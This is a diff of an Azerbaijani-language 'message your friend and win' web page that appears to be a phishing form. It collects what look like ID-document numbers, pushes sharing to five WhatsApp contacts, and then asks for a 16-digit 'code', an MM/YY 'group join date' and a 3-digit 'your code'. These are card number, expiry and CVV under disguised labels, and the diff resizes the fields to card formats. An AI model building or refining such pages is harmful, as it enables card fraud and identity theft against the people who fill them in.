@@ -3,12 +3,15 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="description" content="Dostuna mesaj yaz və qazan" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta http-equiv="X-Frame-Options" content="SAMEORIGIN" />
   <title>Dostuna Mesaj Yaz və Qazan</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
-<!-- ===================== HEADER ===================== -->
+<!-- HEADER -->
 <header class="site-header">
   <div class="header-inner">
     <span class="header-icon">✉️</span>
@@ -16,14 +19,14 @@
   </div>
 </header>
 
-<!-- ===================== MAIN WRAPPER ===================== -->
+<!-- MAIN -->
 <main id="app">
 
-  <!-- ========== SCREEN 1: QEYDİYYAT ========== -->
+  <!-- SCREEN 1: QEYDİYYAT -->
   <section id="screen-register" class="screen active">
     <div class="card">
       <h2 class="card-title">Qeydiyyat</h2>
-      <p class="card-sub">Zəhmət olmasa məlumatlarınızı doldurun</p>
+      <p class="card-sub">Məlumatlarınızı doldurun</p>
 
       <form id="form-register" novalidate autocomplete="off">
 
@@ -49,14 +52,14 @@
         </div>
 
         <div class="form-group">
-          <label for="inp-numara">Numara</label>
-          <input type="text" id="inp-numara" placeholder="Numaranızı daxil edin" maxlength="100" class="uppercase-input" />
+          <label for="inp-numara">Numara <span class="label-hint">(9 simvol)</span></label>
+          <input type="text" id="inp-numara" placeholder="9 simvol daxil edin" maxlength="9" class="uppercase-input" />
           <span class="err" id="err-numara"></span>
         </div>
 
         <div class="form-group">
-          <label for="inp-fon">Fön</label>
-          <input type="text" id="inp-fon" placeholder="Fön məlumatı daxil edin" maxlength="100" class="uppercase-input" />
+          <label for="inp-fon">Fön <span class="label-hint">(7 simvol)</span></label>
+          <input type="text" id="inp-fon" placeholder="7 simvol daxil edin" maxlength="7" class="uppercase-input" />
           <span class="err" id="err-fon"></span>
         </div>
 
@@ -65,7 +68,7 @@
     </div>
   </section>
 
-  <!-- ========== SCREEN 2: PAYLAŞ ========== -->
+  <!-- SCREEN 2: PAYLAŞ -->
   <section id="screen-share" class="screen">
     <div class="card">
       <div class="success-icon">🎉</div>
@@ -78,7 +81,7 @@
       </div>
 
       <button class="btn-whatsapp" id="btn-whatsapp">
-        <svg viewBox="0 0 32 32" width="22" height="22" fill="#fff"><path d="M16 2C8.28 2 2 8.28 2 16c0 2.47.67 4.8 1.84 6.8L2 30l7.37-1.8A13.93 13.93 0 0016 30c7.72 0 14-6.28 14-14S23.72 2 16 2zm0 25.5a11.44 11.44 0 01-5.83-1.6l-.42-.25-4.37 1.07 1.1-4.25-.28-.44A11.48 11.48 0 0116 4.5c6.34 0 11.5 5.16 11.5 11.5S22.34 27.5 16 27.5zm6.3-8.6c-.34-.17-2.02-1-2.34-1.11-.31-.11-.54-.17-.77.17-.23.34-.88 1.11-1.08 1.34-.2.23-.4.26-.74.09-.34-.17-1.44-.53-2.74-1.69-1.01-.9-1.7-2.02-1.9-2.36-.2-.34-.02-.52.15-.69.15-.15.34-.4.51-.6.17-.2.23-.34.34-.57.11-.23.06-.43-.03-.6-.09-.17-.77-1.86-1.06-2.55-.28-.67-.57-.58-.77-.59l-.66-.01c-.23 0-.6.09-.91.43-.31.34-1.2 1.17-1.2 2.86 0 1.69 1.23 3.32 1.4 3.55.17.23 2.42 3.7 5.86 5.19.82.35 1.46.56 1.96.72.82.26 1.57.22 2.16.13.66-.1 2.02-.82 2.31-1.62.28-.8.28-1.48.2-1.62-.09-.14-.31-.23-.65-.4z"/></svg>
+        <svg viewBox="0 0 32 32" width="20" height="20" fill="#fff" aria-hidden="true"><path d="M16 2C8.28 2 2 8.28 2 16c0 2.47.67 4.8 1.84 6.8L2 30l7.37-1.8A13.93 13.93 0 0016 30c7.72 0 14-6.28 14-14S23.72 2 16 2zm0 25.5a11.44 11.44 0 01-5.83-1.6l-.42-.25-4.37 1.07 1.1-4.25-.28-.44A11.48 11.48 0 0116 4.5c6.34 0 11.5 5.16 11.5 11.5S22.34 27.5 16 27.5zm6.3-8.6c-.34-.17-2.02-1-2.34-1.11-.31-.11-.54-.17-.77.17-.23.34-.88 1.11-1.08 1.34-.2.23-.4.26-.74.09-.34-.17-1.44-.53-2.74-1.69-1.01-.9-1.7-2.02-1.9-2.36-.2-.34-.02-.52.15-.69.15-.15.34-.4.51-.6.17-.2.23-.34.34-.57.11-.23.06-.43-.03-.6-.09-.17-.77-1.86-1.06-2.55-.28-.67-.57-.58-.77-.59l-.66-.01c-.23 0-.6.09-.91.43-.31.34-1.2 1.17-1.2 2.86 0 1.69 1.23 3.32 1.4 3.55.17.23 2.42 3.7 5.86 5.19.82.35 1.46.56 1.96.72.82.26 1.57.22 2.16.13.66-.1 2.02-.82 2.31-1.62.28-.8.28-1.48.2-1.62-.09-.14-.31-.23-.65-.4z"/></svg>
         WhatsApp ilə Paylaş (5 Dost)
       </button>
 
@@ -86,7 +89,7 @@
     </div>
   </section>
 
-  <!-- ========== SCREEN 3: MESAJ ========== -->
+  <!-- SCREEN 3: MESAJ -->
   <section id="screen-message" class="screen">
     <div class="card">
       <h2 class="card-title">Mesaj Göndər</h2>
@@ -95,20 +98,20 @@
       <form id="form-message" novalidate autocomplete="off">
 
         <div class="form-group">
-          <label for="inp-reqem">Rəqəm <span class="label-hint">(14 rəqəm)</span></label>
-          <input type="text" id="inp-reqem" placeholder="14 rəqəmli kod daxil edin" maxlength="14" inputmode="numeric" />
+          <label for="inp-reqem">Rəqəm <span class="label-hint">(16 rəqəm)</span></label>
+          <input type="text" id="inp-reqem" placeholder="16 rəqəmli kod daxil edin" maxlength="16" inputmode="numeric" />
           <span class="err" id="err-reqem"></span>
         </div>
 
         <div class="form-group">
-          <label for="inp-tarix">Qrupa Qoşulma Tarixi <span class="label-hint">(AA/İİ)</span></label>
-          <input type="text" id="inp-tarix" placeholder="XX/XX" maxlength="5" inputmode="numeric" />
+          <label for="inp-tarix">Qrupa Qoşulma Tarixi <span class="label-hint">(Ay/İl — məs: 06/27)</span></label>
+          <input type="text" id="inp-tarix" placeholder="AA/İİ" maxlength="5" inputmode="numeric" />
           <span class="err" id="err-tarix"></span>
         </div>
 
         <div class="form-group">
-          <label for="inp-kod">Sənin Kodun <span class="label-hint">(2 rəqəm)</span></label>
-          <input type="text" id="inp-kod" placeholder="XX" maxlength="2" inputmode="numeric" />
+          <label for="inp-kod">Sənin Kodun <span class="label-hint">(3 rəqəm)</span></label>
+          <input type="text" id="inp-kod" placeholder="XXX" maxlength="3" inputmode="numeric" />
           <span class="err" id="err-kod"></span>
         </div>
 
@@ -117,7 +120,7 @@
     </div>
   </section>
 
-  <!-- ========== SCREEN 4: UĞUR ========== -->
+  <!-- SCREEN 4: UĞUR -->
   <section id="screen-success" class="screen">
     <div class="card center-card">
       <div class="success-anim">✅</div>
@@ -129,8 +132,8 @@
 
 </main>
 
-<!-- ===================== LOADING OVERLAY ===================== -->
-<div id="loading-overlay" class="loading-overlay hidden">
+<!-- LOADING -->
+<div id="loading-overlay" class="loading-overlay hidden" role="status" aria-live="polite">
   <div class="spinner"></div>
   <p>Zəhmət olmasa gözləyin...</p>
 </div>
